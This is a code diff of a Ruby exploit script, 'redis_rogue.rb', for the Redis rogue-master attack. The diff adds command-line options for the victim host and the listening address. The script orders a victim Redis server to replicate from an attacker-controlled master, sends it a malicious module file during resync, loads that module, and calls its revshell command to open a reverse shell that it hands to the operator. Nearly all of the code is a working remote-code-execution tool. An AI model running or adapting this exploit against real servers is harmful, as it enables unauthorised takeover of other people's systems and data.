@@ -1,6 +1,48 @@
-#https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf
+#!/usr/bin/ruby
+#Reference: https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf
 
 require "socket"
+require "optparse"
+
+@opts = {port: "6379", skip: false, verbose: false}
+OptionParser.new do |parser|
+	parser.banner = "Usage: ./redis_rogue.rb [options]"
+
+	parser.on("-h", "--host HOST", "Victim") do |h|
+		@opts[:host] = h
+	end
+	
+	parser.on("-p", "--port PORT", /\d*/, "Port (default: 6379)") do |p|
+		@opts[:port] = p
+	end
+
+	parser.on("--lhost LHOST" ,"Address to listen on") do |lhost|
+		@opts[:lhost] = lhost
+	end
+
+	parser.on("-l","--lport LPORT", /\d*/, "Port to listen on") do |lport|
+		@opts[:lport] = lport
+	end
+
+	parser.on("-s","--skip-load", "For when the module is already loaded") do |lport|
+		@opts[:skip] = true
+	end
+
+	parser.on("-v","--verbose", "Log more information") do |lport|
+		@opts[:verbose] = true
+	end
+
+end.parse!
+
+for arg in [:lport,:lhost,:host]
+	if !@opts[arg]
+		abort "Missing #{arg}! (--help for usage)"
+	end
+end
+
+if !/^[0-9\.]+$/.match? @opts[:lhost]
+	abort "LHOST has to be a valid IPv4 address"
+end
 
 class Log
 
@@ -41,37 +83,72 @@ def error msg
 	exit 1
 end
 
-#Our MASTER server
-server = TCPServer.new 2421
-
-#We use this connection to force the server to connect to our master server
-s = TCPSocket.new('localhost', 6379)
-Log.info "Sending SLAVEOF command"
-s.puts "SLAVEOF 127.0.0.1 2421"
-error "Failed to send SLAVEOF" if !s.gets.start_with? "+OK"
-Log.info "Renaming database file"
-s.puts "CONFIG SET dbfilename pwn"
-error "Failed to set dbfilename" if !s.gets.start_with? "+OK"
-
-class String
-	def is_number?
-		true if Float(self) rescue false
-	end
-end
-
 def send msg
 	@client.puts msg
-	Log.sen msg
+	Log.sen msg if @opts[:verbose]
 end
 
-def rec
+def rec (print=true)
 	msg = @client.gets
 	if msg == nil
 		Log.err "Received empty message, the socket prob closed"
 		raise
 	end
 	msg.gsub!(/[\r\n]/, "")
+	Log.rec msg if print && @opts[:verbose]
 	return msg || ""
+end
+
+def exploit
+	server = TCPServer.new @opts[:lport]
+
+	send "pwn.revshell #{@opts[:lhost]} #{@opts[:lport]}"
+
+	shell = server.accept
+
+	error "Error connecting to LHOST" if !rec.start_with? "+OK"
+	Log.succ "Succesfull connect-back"
+
+	Log.info "Starting (fully upgradeable) shell"
+
+	loop do
+		begin
+			print shell.read_nonblock(1)
+		rescue
+		end
+		begin
+			shell.write STDIN.read_nonblock(1)
+		rescue
+		end
+	end
+end
+
+# Skip most of the exploit
+if @opts[:skip]
+	Log.info "Skipping module loading"
+	@client = TCPSocket.new(@opts[:host], @opts[:port])
+	@client
+	exploit
+	exit
+end
+
+#Our MASTER server
+server = TCPServer.new 2421
+
+#We use this connection to force the server to connect to our master server
+initial_sock = TCPSocket.new(@opts[:host], @opts[:port])
+@client = initial_sock
+Log.info "Sending SLAVEOF command"
+send "SLAVEOF 127.0.0.1 2421"
+error "Failed to send SLAVEOF" if !rec.start_with? "+OK"
+Log.info "Renaming database file"
+send "CONFIG SET dbfilename pwn"
+error "Failed to set dbfilename" if !rec.start_with? "+OK"
+
+class String
+	def is_number?
+		true if Float(self) rescue false
+	end
 end
 
 def parser msg
@@ -80,10 +157,10 @@ def parser msg
 	arguments = []
 
 	for i in (0..argument_count-1)
-		arg_length = rec
+		arg_length = rec false
 		return Log.err "Can't parse argument length" if !arg_length.start_with? "$" or !arg_length[1..].is_number?
 		arg_length = arg_length[1..].to_i
-		argument = rec
+		argument = rec false
 		if argument.length != arg_length
 			Log.warn "Argument length and specified length mis-match"
 		end
@@ -92,19 +169,17 @@ def parser msg
 	return arguments
 end
 
-payload = File.read("module/module.so")
+payload = File.read("./module.so")
 
 #We only accept once, it will attempt to make new connections because our data is invalid
 @client = server.accept
 Log.succ "Succesful connection with slave"
 
-@payload_send = false
-
 # Resync database
 loop do
-	if msg = rec
+	if msg = rec(false)
 		arguments = parser msg
-		Log.rec arguments.join " "
+		Log.rec arguments.join " " if @opts[:verbose]
 		next if !arguments
 		case arguments[0]
 		when "PING"
@@ -116,7 +191,7 @@ loop do
 			send "+FULLRESYNC #{"A" * 40} 1\r\n"
 			Log.info "Sending payload..."
 			@client.puts "$#{payload.length}\r\n#{payload}"
-			@payload_send = true
+			Log.sen "(bulk string containing binary data )" if @opts[:verbose]
 
 			#This socket is dead
 			break
@@ -127,32 +202,12 @@ end
 
 error "Database resync failed, payload not send" if @payload_send == false
 
-@client = s #Reuse old connection to send commands
+@client = initial_sock #Reuse old connection to send commands
 
 sleep 0.5
 Log.info "Attempt to load module"
 send "module load ./pwn"
-error "Failed to load module (if it's already loaded use the -s flag)" if !s.gets.start_with? "+OK"
+error "Failed to load module (if it's already loaded use the -s flag)" if !@client.gets.start_with? "+OK"
 Log.succ "Succesfully loaded the module"
 
-server = TCPServer.new 1234
-
-send "pwn.revshell 127.0.0.1 1234"
-
-shell = server.accept
-
-error "Error connecting to LHOST" if !s.gets.start_with? "+OK"
-Log.succ "Succesfull connect-back"
-
-Log.info "Starting (fully upgradeable) shell"
-
-loop do
-	begin
-		print shell.read_nonblock(1)
-	rescue
-	end
-	begin
-		shell.write STDIN.read_nonblock(1)
-	rescue
-	end
-end
+exploit
